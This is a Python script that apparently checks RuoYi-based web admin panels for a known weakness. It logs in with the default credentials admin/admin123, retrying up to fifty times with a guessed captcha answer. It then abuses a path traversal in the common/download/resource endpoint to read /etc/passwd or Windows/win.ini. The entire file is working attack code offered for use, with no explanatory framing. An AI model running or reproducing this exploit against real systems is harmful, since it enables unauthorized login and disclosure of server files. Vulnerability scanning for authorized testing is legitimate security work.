import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl
	response=requests.get(url,timeout=5,verify=False)
	if "ry-ui.css" in response.text and "ry-ui.js" in response.text:
		cook=''
		for _ in range(50):
			url=baseurl+"captcha/captchaImage?type=math&s=0.18360371015197774"
			response=requests.get(url,timeout=5,verify=False)
			cookie=response.headers['Set-Cookie']
			url=baseurl+"login"
			headers={
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
			"Content-Type": "application/x-www-form-urlencoded",
			"Cookie": cookie,
			}
			body="username=admin&password=admin123&validateCode=12&rememberMe=false"
			response=requests.post(url,body,headers=headers,timeout=5,verify=False)
			if '"code":0' in response.text:
				cook+=cookie
				break		
		url=baseurl+"common/download/resource?resource=/profile/../../../../etc/passwd"
		headers={
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
			"Content-Type": "application/x-www-form-urlencoded",
			"Cookie": cook,
			}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and re.search("root:[x*]:0:0:",response.text):
			linux0=True
		else:
			linux0=False
		url=baseurl+"common/download/resource?resource=/profile/../../../../Windows/win.ini"
		headers={
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
			"Content-Type": "application/x-www-form-urlencoded",
			"Cookie": cook,
			}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and "for 16-bit app support" in response.text:
			windows0=True
		else:
			windows0=False
		if linux0 or windows0:
			return True
		else:
			return False
	else:
		return False